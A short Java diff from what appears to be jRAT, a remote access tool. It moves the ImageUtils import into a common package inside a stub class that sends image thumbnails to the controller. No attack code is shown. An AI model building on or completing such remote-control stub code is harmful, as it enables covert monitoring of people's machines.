@@ -10,8 +10,8 @@ import java.io.DataOutputStream;
 import se.jrat.common.compress.GZip;
 import se.jrat.common.crypto.Crypto;
 import se.jrat.common.io.StringWriter;
+import se.jrat.common.utils.ImageUtils;
 import se.jrat.stub.Main;
-import se.jrat.stub.utils.ImageUtils;
 
 public class Packet71AllThumbnails extends AbstractOutgoingPacket {
 
